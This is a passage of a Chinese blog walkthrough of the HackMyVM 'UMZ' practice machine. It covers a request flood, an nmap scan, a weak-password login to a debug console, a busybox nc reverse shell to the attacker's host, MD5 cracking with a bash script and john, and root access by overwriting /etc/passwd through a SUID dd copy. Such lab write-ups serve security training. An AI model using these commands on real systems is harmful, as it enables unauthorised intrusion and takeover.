请求 498: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (95.00 ms)
请求 499: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (94.06 ms)
请求 500: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (92.88 ms)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接着就会发现这个index.php页面打不开了</p>
<p>重新nmap扫描发现有一个8080端口</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# nmap 192.168.134.92 -A
Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-01 11:18 EDT
Nmap scan report for 192.168.134.92
Host is up (0.0010s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22&#x2F;tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
8080&#x2F;tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2)
| http-title: Debug Console Login
|_Requested resource was http:&#x2F;&#x2F;192.168.134.92:8080&#x2F;login
|_http-server-header: Werkzeug&#x2F;1.0.1 Python&#x2F;3.9.2
MAC Address: 08:00:27:EE:0D:32 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.04 ms 192.168.134.92

OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前往这个8080查看一下内容</p>
<p><img src="/posts/185bd5a3/image-20250702002408193.png" alt="image-20250702002408193"></p>
<p>弱口令绕过，用户名和密码都是admin，是一个命令执行框</p>
<p><img src="/posts/185bd5a3/image-20250702002745478.png" alt="image-20250702002745478"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><pre class="line-numbers language-none"><code class="language-none">busybox nc 192.168.134.76 1234  -e  &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h3><pre class="line-numbers language-none"><code class="language-none">welcome@Umz:~$ ls -al
total 24
drwxr-xr-x 2 welcome welcome 4096 May  3 10:26 .
drwxr-xr-x 4 root    root    4096 May  3 10:27 ..
lrwxrwxrwx 1 root    root       9 May  3 10:26 .bash_history -&gt; &#x2F;dev&#x2F;null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      44 May  3 10:26 user.txt
welcome@Umz:~$ cat user.txt
flag&#123;user-4483f72525b3c316704cf126bec02d5c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看sudo权限</p>
<pre class="line-numbers language-none"><code class="language-none">welcome@Umz:~$ sudo -l
Matching Defaults entries for welcome on Umz:
    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;s
bin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin

User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;md5sum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以使用md5sum，来查看文件的md5值</p>
<p>在opt目录下的文件夹内发现了一个umz.pass文件，但是打不开，使用&#x2F;usr&#x2F;bin&#x2F;md5sum进行转换</p>
<pre class="line-numbers language-none"><code class="language-none">welcome@Umz:~$ cd &#x2F;opt
welcome@Umz:&#x2F;opt$ ls
flask-debug
welcome@Umz:&#x2F;opt$ cd flask-debug&#x2F;
welcome@Umz:&#x2F;opt&#x2F;flask-debug$ ls
flask_debug.py  umz.pass
welcome@Umz:&#x2F;opt&#x2F;flask-debug$ cat umz.pass 
cat: umz.pass: Permission denied
welcome@Umz:&#x2F;opt&#x2F;flask-debug$ sudo &#x2F;usr&#x2F;bin&#x2F;md5sum umz.pass 
a963fadd7fd379f9bc294ad0ba44f659  umz.pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在本机内使用john进行一次爆破尝试后，发现无法爆破得出有用的信息，查询得知linux文件默认让文件以一个换行符<code>\n</code>结尾，因此john无法爆破出来</p>
<p>写一个bash脚本进行爆破</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# cat 2
#!&#x2F;bin&#x2F;bash

if [ $# -ne 2 ]; then
  echo &quot;Usage: $0 &lt;target_md5_hash&gt; &lt;wordlist&gt;&quot;
  exit 1
fi

target_hash&#x3D;$1
wordlist&#x3D;$2

while IFS&#x3D; read -r word; do
  # Generate MD5 hash of the current word
  hash&#x3D;$(echo &quot;$word&quot; | md5sum | awk &#39;&#123;print $1&#125;&#39;)

  # Compare with target hash
  if [ &quot;$hash&quot; &#x3D;&#x3D; &quot;$target_hash&quot; ]; then
    echo &quot;Password found: $word&quot;
    exit 0
  fi
done &lt; &quot;$wordlist&quot;

echo &quot;Password not found in the wordlist.&quot;
exit 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>爆破得到密码</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# .&#x2F;2 a963fadd7fd379f9bc294ad0ba44f659 rockyou.txt
  Password found: sunshine3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>经过爆破后的密码与通过ls -la查看umz.pass的长度相差了一位</p>
<pre class="line-numbers language-none"><code class="language-none">welcome@Umz:&#x2F;opt&#x2F;flask-debug$ ls -la umz.pass
ls -la umz.pass
-rwx------ 1 root root 10 May  3 10:32 umz.pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里是10个长度，而sunshine3仅仅只有9个长度，猜测是因为以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# echo aaa &gt; 1.txt

┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# ls -la 1.txt
-rw-rw-r-- 1 root root 4 Jul  1 13:54 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>明明只有三个aaa，但是ls -la后却有四个长度，猜测是echo会多增加一个换行符</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# xxd 1.txt
00000000: 6161 610a                                aaa.

┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# cat -A 1.txt
aaa$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这些都可以验证echo会多增加一个换行符，如果是用下面的语句则不会增加换行符</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# echo -n aaa &gt;1.txt

┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# ls -la 1.txt
-rw-rw-r-- 1 root root 3 Jul  1 13:57 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果没有换行符的话，sunshine3的md5值应该为62b9445ccdf56196050ee99be5949420，再经过爆破可以得到明文</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# john tmp --wordlist&#x3D;rockyou.txt --format&#x3D;Raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256&#x2F;256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork&#x3D;4
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
sunshine3        (?)
1g 0:00:00:00 DONE (2025-07-01 14:03) 50.00g&#x2F;s 499200p&#x2F;s 499200c&#x2F;s 499200C&#x2F;s juandiego..stevens
Use the &quot;--show --format&#x3D;Raw-MD5&quot; options to display all of the cracked passwords reliably
Session completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
└─# ssh umzyyds@192.168.134.92
umzyyds@192.168.134.92&#39;s password:
Linux Umz 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU&#x2F;Linux system are free software;
the exact distribution terms for each program are described in the
individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.

Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
umzyyds@Umz:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个目录下发现了一个程序Dashazi</p>
<pre class="line-numbers language-none"><code class="language-none">umzyyds@Umz:~$ ls -al
total 96
drwx------ 2 umzyyds umzyyds  4096 May  3 10:42 .
drwxr-xr-x 4 root    root     4096 May  3 10:27 ..
lrwxrwxrwx 1 root    root        9 May  3 10:38 .bash_history -&gt; &#x2F;dev&#x2F;null
-rw-r--r-- 1 umzyyds umzyyds   220 May  3 10:27 .bash_logout
-rw-r--r-- 1 umzyyds umzyyds  3526 May  3 10:27 .bashrc
-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
-rw-r--r-- 1 umzyyds umzyyds   807 May  3 10:27 .profile
umzyyds@Umz:~$ .&#x2F;Dashazi --h
Usage: .&#x2F;Dashazi [OPERAND]...
  or:  .&#x2F;Dashazi OPTION
Copy a file, converting and formatting according to the operands.

  bs&#x3D;BYTES        read and write up to BYTES bytes at a time (default: 512);
                  overrides ibs and obs
  cbs&#x3D;BYTES       convert BYTES bytes at a time
  conv&#x3D;CONVS      convert the file as per the comma separated symbol list
  count&#x3D;N         copy only N input blocks
  ibs&#x3D;BYTES       read up to BYTES bytes at a time (default: 512)
  if&#x3D;FILE         read from FILE instead of stdin
  iflag&#x3D;FLAGS     read as per the comma separated symbol list
  obs&#x3D;BYTES       write BYTES bytes at a time (default: 512)
  of&#x3D;FILE         write to FILE instead of stdout
  oflag&#x3D;FLAGS     write as per the comma separated symbol list
  seek&#x3D;N          skip N obs-sized blocks at start of output
  skip&#x3D;N          skip N ibs-sized blocks at start of input
  status&#x3D;LEVEL    The LEVEL of information to print to stderr;
                  &#39;none&#39; suppresses everything but error messages,
                  &#39;noxfer&#39; suppresses the final transfer statistics,
                  &#39;progress&#39; shows periodic transfer statistics

N and BYTES may be followed by the following multiplicative suffixes:
c &#x3D;1, w &#x3D;2, b &#x3D;512, kB &#x3D;1000, K &#x3D;1024, MB &#x3D;1000*1000, M &#x3D;1024*1024, xM &#x3D;M,
GB &#x3D;1000*1000*1000, G &#x3D;1024*1024*1024, and so on for T, P, E, Z, Y.

Each CONV symbol may be:

  ascii     from EBCDIC to ASCII
  ebcdic    from ASCII to EBCDIC
  ibm       from ASCII to alternate EBCDIC
  block     pad newline-terminated records with spaces to cbs-size
  unblock   replace trailing spaces in cbs-size records with newline
  lcase     change upper case to lower case
  ucase     change lower case to upper case
  sparse    try to seek rather than write the output for NUL input blocks
  swab      swap every pair of input bytes
  sync      pad every input block with NULs to ibs-size; when used
            with block or unblock, pad with spaces rather than NULs
  excl      fail if the output file already exists
  nocreat   do not create the output file
  notrunc   do not truncate the output file
  noerror   continue after read errors
  fdatasync  physically write output file data before finishing
  fsync     likewise, but also write metadata

Each FLAG symbol may be:

  append    append mode (makes sense only for output; conv&#x3D;notrunc suggested)
  direct    use direct I&#x2F;O for data
  directory  fail unless a directory
  dsync     use synchronized I&#x2F;O for data
  sync      likewise, but also for metadata
  fullblock  accumulate full blocks of input (iflag only)
  nonblock  use non-blocking I&#x2F;O
  noatime   do not update access time
  nocache   Request to drop cache.  See also oflag&#x3D;sync
  noctty    do not assign controlling terminal from file
  nofollow  do not follow symlinks
  count_bytes  treat &#39;count&#x3D;N&#39; as a byte count (iflag only)
  skip_bytes  treat &#39;skip&#x3D;N&#39; as a byte count (iflag only)
  seek_bytes  treat &#39;seek&#x3D;N&#39; as a byte count (oflag only)

Sending a USR1 signal to a running &#39;dd&#39; process makes it
print I&#x2F;O statistics to standard error and then resume copying.

Options are:

      --help     display this help and exit
      --version  output version information and exit

GNU coreutils online help: &lt;https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;coreutils&#x2F;&gt;
Full documentation at: &lt;https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;coreutils&#x2F;dd&gt;
or available locally via: info &#39;(coreutils) dd invocation&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>效果跟dd差不多,<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/dd/">dd | GTFOBins</a></p>
<p>直接将&#x2F;etc&#x2F;passwd复制到当前目录下，然后修改当前目录下的passwd文件，在这个文件内添加一个用户，并赋予他root的权限</p>
<pre class="line-numbers language-none"><code class="language-none">umzyyds@Umz:~$ cp &#x2F;etc&#x2F;passwd .
umzyyds@Umz:~$ ls
Dashazi  passwd
umzyyds@Umz:~$ cat passwd
root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin
systemd-network:x:102:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin
systemd-resolve:x:103:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin
systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin
messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
sshd:x:105:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
welcome:x:1000:1000:,,,:&#x2F;home&#x2F;welcome:&#x2F;bin&#x2F;bash
ii:$1$bhHO57RL$EvrU4Jzh34Q&#x2F;BgOFBEjI&#x2F;0:0:0:xxoo,,,:&#x2F;root:&#x2F;bin&#x2F;bash
umzyyds:x:1001:1001:,,,:&#x2F;home&#x2F;umzyyds:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接着用这个命令进行替换</p>
<pre class="line-numbers language-none"><code class="language-none">umzyyds@Umz:~$ cat passwd |.&#x2F;Dashazi of&#x3D;&#x2F;etc&#x2F;passwd
2+1 records in
2+1 records out
1508 bytes (1.5 kB, 1.5 KiB) copied, 0.00213641 s, 706 kB&#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么就可以用切换到ii的用户上，也就是root</p>
<h3 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h3><pre class="line-numbers language-none"><code class="language-none">umzyyds@Umz:~$ su - ii
Password:
root@Umz:~# id
uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)
root@Umz:~# pwd
&#x2F;root
root@Umz:~# cat root.txt
flag&#123;root-a73c45107081c08dd4560206b8ef8205&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/185bd5a3.html">https://drume2.github.io/posts/185bd5a3.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HMV/">HMV</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/e071dd2c.html"><img class="prev-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HMV-Nexus</div></div></a></div><div class="next-post pull-right"><a href="/posts/84d43366.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-Hommie</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/877cf9fc.html" title="HMV-Art"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-01</div><div class="title">HMV-Art</div></div></a></div><div><a href="/posts/7ffe1a8a.html" title="HMV-Alzheimer"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="title">HMV-Alzheimer</div></div></a></div><div><a href="/posts/2c2bf748.html" title="HMV-Blackhat"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-19</div><div class="title">HMV-Blackhat</div></div></a></div><div><a href="/posts/b97023cc.html" title="HMV-Beloved"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-17</div><div class="title">HMV-Beloved</div></div></a></div><div><a href="/posts/fa16f4c.html" title="HMV-Comingsoon"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-31</div><div class="title">HMV-Comingsoon</div></div></a></div><div><a href="/posts/d17ac07d.html" title="HMV-Breakout"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="title">HMV-Breakout</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">92</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HMV-UMZ"><span class="toc-number">1.</span> <span class="toc-text">HMV-UMZ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#userflag"><span class="toc-number">1.2.1.</span> <span class="toc-text">userflag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.3.</span> <span class="toc-text">ssh连接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rootflag"><span class="toc-number">1.3.1.</span> <span class="toc-text">rootflag</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/df52e3cb.html" title="群友靶机-SudoHome"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-SudoHome"/></a><div class="content"><a class="title" href="/posts/df52e3cb.html" title="群友靶机-SudoHome">群友靶机-SudoHome</a><time datetime="2025-11-23T04:39:26.000Z" title="发表于 2025-11-23 12:39:26">2025-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f480f654.html" title="群友靶机-Yibasuo"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-Yibasuo"/></a><div class="content"><a class="title" href="/posts/f480f654.html" title="群友靶机-Yibasuo">群友靶机-Yibasuo</a><time datetime="2025-11-22T04:19:10.000Z" title="发表于 2025-11-22 12:19:10">2025-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/80a0419f.html" title="HMV-Hunter"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Hunter"/></a><div class="content"><a class="title" href="/posts/80a0419f.html" title="HMV-Hunter">HMV-Hunter</a><time datetime="2025-11-19T07:58:10.000Z" title="发表于 2025-11-19 15:58:10">2025-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4691ecf8.html" title="群友靶机-Baby"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-Baby"/></a><div class="content"><a class="title" href="/posts/4691ecf8.html" title="群友靶机-Baby">群友靶机-Baby</a><time datetime="2025-10-13T03:04:44.000Z" title="发表于 2025-10-13 11:04:44">2025-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b2e47ed4.html" title="群友靶机-The_fool"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-The_fool"/></a><div class="content"><a class="title" href="/posts/b2e47ed4.html" title="群友靶机-The_fool">群友靶机-The_fool</a><time datetime="2025-09-28T10:15:30.000Z" title="发表于 